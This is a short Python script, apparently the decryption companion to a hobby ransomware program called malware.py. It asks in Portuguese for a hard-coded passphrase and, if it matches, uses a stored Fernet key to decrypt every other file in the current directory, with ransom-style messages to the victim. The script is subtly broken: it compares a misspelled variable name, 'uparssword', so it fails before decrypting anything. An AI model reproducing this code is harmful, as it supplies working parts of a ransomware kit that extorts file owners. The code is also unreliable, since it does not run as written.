import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "malware.py" or file == "thekey.key" or file == "decrypt":
        continue 
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()
passphrase = "N3uromanc3r"
upassword = input("Entre a senha para decryptar o arquivo: ")
if uparssword == passphrase:
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
        content_decrypt = Fernet(secretkey).decrypt(content)
        with open(file, "wb") as thefile:
            thefile.write(content_decrypt)

        print("Você recuperou todos os seus arquivos")

else:
        print("Entre com a senha correta para recuperar seus arquivos")